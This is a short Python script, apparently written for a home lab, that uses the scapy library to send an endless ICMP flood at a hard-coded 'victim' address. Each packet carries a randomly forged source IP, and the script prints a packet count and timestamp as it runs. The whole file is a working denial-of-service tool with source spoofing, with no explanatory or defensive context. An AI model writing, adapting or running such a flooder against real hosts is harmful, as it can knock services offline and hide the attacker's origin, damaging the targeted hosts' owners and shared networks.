from scapy.all import *
from datetime import datetime
import random

#IP address of the victim's machine
target_ip = "192.168.56.102"

def icmp_flood(target_ip):
	i = 0
	while True:
		i = i+1
		ip_layer = IP(src=".".join(map(str, (random.randint(1, 254) for _ in range(4)))), dst=target_ip)
		icmp_layer = ICMP()
		packet = ip_layer/icmp_layer
		send(packet, verbose=0)
		current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S%f")
		print(f"{i} - Packet sent - {current_time}")

icmp_flood(target_ip)
